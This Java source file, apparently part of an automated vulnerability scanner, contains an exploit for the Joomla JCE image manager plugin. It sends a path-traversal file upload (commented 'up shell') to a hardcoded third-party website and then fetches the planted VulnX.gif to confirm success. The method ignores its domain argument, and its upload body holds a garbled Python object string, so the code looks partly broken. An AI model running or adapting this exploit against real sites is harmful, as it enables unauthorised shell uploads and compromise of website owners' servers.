package com.funtap.awass.Exploit;

import com.funtap.awass.Exploit.Result.Result;
import net.minidev.json.JSONUtil;
import okhttp3.*;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;

public class joomla_exploit {
 public Result com_jce(String domain) {
        Result result = new Result();
        try {
            // up shell
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
            MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
            RequestBody body = RequestBody.create(mediaType, "upload-dir=./../../&upload-overwrite=0&Filedata=<_io.BufferedReader+name='shell/VulnX.gif'>&action=Upload");
            Request request = new Request.Builder()
                    .url("http://boumaghis.free.fr//index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20")
                    .method("POST", body)
                    .addHeader("Content-Type", "application/x-www-form-urlencoded")
                    .addHeader("User-Agent", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801")
                    .build();
            Response response = client.newCall(request).execute();
            //detect

            client = new OkHttpClient().newBuilder()
                    .followRedirects(false)
                    .build();
             request = new Request.Builder()
                    .url("http://boumaghis.free.fr//VulnX.gif")
                    .method("GET", null)
                    .build();
             response = client.newCall(request).execute();
            String html = response.body().string();
            if (html.contains("/image/gif/")) {
                result = new Result("http://boumaghis.free.fr//VulnX.gif", "com_jce", true, "VulnX.gif");
            } else {
                result = new Result("http://boumaghis.free.fr//VulnX.gif", "com_jce", false, "VulnX.gif");
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return result;
    }

}


